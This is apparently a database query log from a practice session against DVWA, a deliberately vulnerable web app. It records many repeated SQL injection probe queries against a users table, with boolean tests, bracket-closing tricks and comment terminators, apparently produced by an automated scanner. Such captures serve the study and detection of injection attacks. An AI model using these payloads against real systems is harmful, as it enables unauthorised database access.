"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS tCXE WHERE 7819=7819 AND 8935=8675#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS JHQR WHERE 1512=1512 AND 6329=6329#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS xVtq WHERE 6522=6522 AND 4123=4875#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS cmPW WHERE 1683=1683 AND 6329=6329#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' IN BOOLEAN MODE) AND 2632=2823#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1446') OR 4214=6764#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2061' OR 8319=4112#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1130' wSLJKMCLbz#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-5628')) OR 8985=2879#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2406'))) OR 7502=5128#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1876')) AS sAiu WHERE 2076=2076 OR 8734=1357#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-7856')) AS JqLs WHERE 8622=8622 OR 5362=5362#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-6976') AS mHNG WHERE 1467=1467 OR 6858=4300#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-8029') AS ylcm WHERE 2291=2291 OR 5362=5362#'",0.000002,0,0,1563544499
USE dvwa,0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'",0.000003,0,0,1563544499
# administrator command: Quit,0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11.(')("".),('",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'PiKnBx<'"">vyombG'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3679=5937 AND ('MbAN'='MbAN'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2363=3768 AND 'bTEQ'='bTEQ'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3150=8607#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2650=8379#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AND 4628=4516#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'))) AND 6732=1522#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS tCXE WHERE 7819=7819 AND 8935=8675#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS JHQR WHERE 1512=1512 AND 6329=6329#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS xVtq WHERE 6522=6522 AND 4123=4875#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS cmPW WHERE 1683=1683 AND 6329=6329#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' IN BOOLEAN MODE) AND 2632=2823#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1446') OR 4214=6764#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2061' OR 8319=4112#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1130' wSLJKMCLbz#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-5628')) OR 8985=2879#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2406'))) OR 7502=5128#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1876')) AS sAiu WHERE 2076=2076 OR 8734=1357#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-7856')) AS JqLs WHERE 8622=8622 OR 5362=5362#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-6976') AS mHNG WHERE 1467=1467 OR 6858=4300#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-8029') AS ylcm WHERE 2291=2291 OR 5362=5362#'",0.000003,0,0,1563544499
USE dvwa,0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'",0.000049,0,0,1563544499
# administrator command: Quit,0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11.(')("".),('",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'PiKnBx<'"">vyombG'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3679=5937 AND ('MbAN'='MbAN'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2363=3768 AND 'bTEQ'='bTEQ'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3150=8607#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2650=8379#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AND 4628=4516#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'))) AND 6732=1522#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS tCXE WHERE 7819=7819 AND 8935=8675#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS JHQR WHERE 1512=1512 AND 6329=6329#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS xVtq WHERE 6522=6522 AND 4123=4875#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS cmPW WHERE 1683=1683 AND 6329=6329#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' IN BOOLEAN MODE) AND 2632=2823#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1446') OR 4214=6764#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2061' OR 8319=4112#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1130' wSLJKMCLbz#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-5628')) OR 8985=2879#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2406'))) OR 7502=5128#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1876')) AS sAiu WHERE 2076=2076 OR 8734=1357#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-7856')) AS JqLs WHERE 8622=8622 OR 5362=5362#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-6976') AS mHNG WHERE 1467=1467 OR 6858=4300#'",0.000049,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-8029') AS ylcm WHERE 2291=2291 OR 5362=5362#'",0.000049,0,0,1563544499
USE dvwa,0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'",0.000162,0,0,1563544499
# administrator command: Quit,0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11.(')("".),('",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'PiKnBx<'"">vyombG'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3679=5937 AND ('MbAN'='MbAN'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2363=3768 AND 'bTEQ'='bTEQ'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3150=8607#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2650=8379#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AND 4628=4516#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'))) AND 6732=1522#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS tCXE WHERE 7819=7819 AND 8935=8675#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS JHQR WHERE 1512=1512 AND 6329=6329#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS xVtq WHERE 6522=6522 AND 4123=4875#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS cmPW WHERE 1683=1683 AND 6329=6329#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' IN BOOLEAN MODE) AND 2632=2823#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1446') OR 4214=6764#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2061' OR 8319=4112#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1130' wSLJKMCLbz#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-5628')) OR 8985=2879#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2406'))) OR 7502=5128#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1876')) AS sAiu WHERE 2076=2076 OR 8734=1357#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-7856')) AS JqLs WHERE 8622=8622 OR 5362=5362#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-6976') AS mHNG WHERE 1467=1467 OR 6858=4300#'",0.000162,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-8029') AS ylcm WHERE 2291=2291 OR 5362=5362#'",0.000162,0,0,1563544499
USE dvwa,0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'",0.000002,0,0,1563544499
# administrator command: Quit,0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11.(')("".),('",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'PiKnBx<'"">vyombG'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3679=5937 AND ('MbAN'='MbAN'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2363=3768 AND 'bTEQ'='bTEQ'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3150=8607#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2650=8379#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AND 4628=4516#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'))) AND 6732=1522#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS tCXE WHERE 7819=7819 AND 8935=8675#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS JHQR WHERE 1512=1512 AND 6329=6329#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS xVtq WHERE 6522=6522 AND 4123=4875#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS cmPW WHERE 1683=1683 AND 6329=6329#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' IN BOOLEAN MODE) AND 2632=2823#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1446') OR 4214=6764#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2061' OR 8319=4112#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1130' wSLJKMCLbz#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-5628')) OR 8985=2879#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2406'))) OR 7502=5128#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1876')) AS sAiu WHERE 2076=2076 OR 8734=1357#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-7856')) AS JqLs WHERE 8622=8622 OR 5362=5362#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-6976') AS mHNG WHERE 1467=1467 OR 6858=4300#'",0.000002,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-8029') AS ylcm WHERE 2291=2291 OR 5362=5362#'",0.000002,0,0,1563544499
USE dvwa,0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'",0.000003,0,0,1563544499
# administrator command: Quit,0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11.(')("".),('",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'PiKnBx<'"">vyombG'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3679=5937 AND ('MbAN'='MbAN'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2363=3768 AND 'bTEQ'='bTEQ'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3150=8607#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2650=8379#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AND 4628=4516#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'))) AND 6732=1522#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS tCXE WHERE 7819=7819 AND 8935=8675#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS JHQR WHERE 1512=1512 AND 6329=6329#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS xVtq WHERE 6522=6522 AND 4123=4875#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS cmPW WHERE 1683=1683 AND 6329=6329#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' IN BOOLEAN MODE) AND 2632=2823#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1446') OR 4214=6764#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2061' OR 8319=4112#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1130' wSLJKMCLbz#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-5628')) OR 8985=2879#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2406'))) OR 7502=5128#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1876')) AS sAiu WHERE 2076=2076 OR 8734=1357#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-7856')) AS JqLs WHERE 8622=8622 OR 5362=5362#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-6976') AS mHNG WHERE 1467=1467 OR 6858=4300#'",0.000003,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-8029') AS ylcm WHERE 2291=2291 OR 5362=5362#'",0.000003,0,0,1563544499
USE dvwa,0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'",0.000041,0,0,1563544499
# administrator command: Quit,0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11.(')("".),('",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'PiKnBx<'"">vyombG'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3679=5937 AND ('MbAN'='MbAN'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2363=3768 AND 'bTEQ'='bTEQ'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3150=8607#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2650=8379#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AND 4628=4516#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'))) AND 6732=1522#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS tCXE WHERE 7819=7819 AND 8935=8675#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11')) AS JHQR WHERE 1512=1512 AND 6329=6329#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS xVtq WHERE 6522=6522 AND 4123=4875#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AS cmPW WHERE 1683=1683 AND 6329=6329#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' IN BOOLEAN MODE) AND 2632=2823#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1446') OR 4214=6764#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2061' OR 8319=4112#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1130' wSLJKMCLbz#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-5628')) OR 8985=2879#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-2406'))) OR 7502=5128#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-1876')) AS sAiu WHERE 2076=2076 OR 8734=1357#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-7856')) AS JqLs WHERE 8622=8622 OR 5362=5362#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-6976') AS mHNG WHERE 1467=1467 OR 6858=4300#'",0.000041,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '-8029') AS ylcm WHERE 2291=2291 OR 5362=5362#'",0.000041,0,0,1563544499
USE dvwa,0.000136,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'",0.000136,0,0,1563544499
# administrator command: Quit,0.000136,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11.(')("".),('",0.000136,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11'PiKnBx<'"">vyombG'",0.000136,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3679=5937 AND ('MbAN'='MbAN'",0.000136,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11' AND 2363=3768 AND 'bTEQ'='bTEQ'",0.000136,0,0,1563544499
"SELECT first_name, last_name FROM users WHERE user_id = '11') AND 3150=8607#'",0.000136,0,0,1563544499
